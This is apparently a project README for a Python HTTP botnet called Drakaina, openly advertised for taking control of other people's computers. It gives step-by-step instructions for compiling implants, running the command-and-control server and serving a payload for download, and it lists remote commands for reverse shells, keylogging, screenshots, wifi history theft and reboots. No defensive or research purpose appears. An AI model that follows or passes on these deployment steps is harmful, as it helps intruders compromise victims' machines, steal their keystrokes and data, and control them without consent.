# Drakaina-Botnet
A HTTP botnet with the main core features with more to come, completely made in python.
Take control of anyone's computer like it's non of your buisness, because it is not.
![alt text](https://ibb.co/FWn9sWK)


# Instructions:

1) Make sure all files are in the same folder.

2) " python3 commandcontrol.py "

3) " /compile "

4) once finished place both compiled files in the static/windows folder.

5) open server.cfg and change the server and port to what you want the server to run on.

6) " python3 server.py "

7) test by downloading the Watchdog file from the link "http://<yourip>:<port>/downloads/windows/watchdog"


# Command & Control :

--- main options ---

/list = show registered users

/target = select a target

----------------------------


--- targeted options ---

/rshell = change current targets reverse shell server and port .

/rshell_show = show current targets reverse shell server and port .

/command = attempt a shell command or a pre-defined command
     {rshell, keylogger, getwifi, screenshot, reboot}

/getwifi = get wifi SSID history of current target.

----------------------------


     

